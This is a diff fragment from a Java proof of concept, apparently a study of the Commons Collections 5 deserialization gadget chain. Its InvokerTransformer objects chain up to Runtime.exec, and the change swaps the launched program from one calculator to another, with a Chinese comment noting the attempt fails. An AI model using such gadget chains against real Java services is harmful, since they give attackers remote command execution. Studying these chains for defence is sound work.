@@ -51,7 +51,7 @@ public class CommonCollection5 {
         InvokerTransformer invokerTransformer = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null});
         InvokerTransformer invokerTransformer1 = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null});
 //        Runtime.getRuntime().exec();
-        InvokerTransformer invokerTransformer2 = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"kcalc"});
+        InvokerTransformer invokerTransformer2 = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"galculator111"});
         // 加不加这个，都不行。
         ConstantTransformer constantTransformer1 = new ConstantTransformer("1");
 
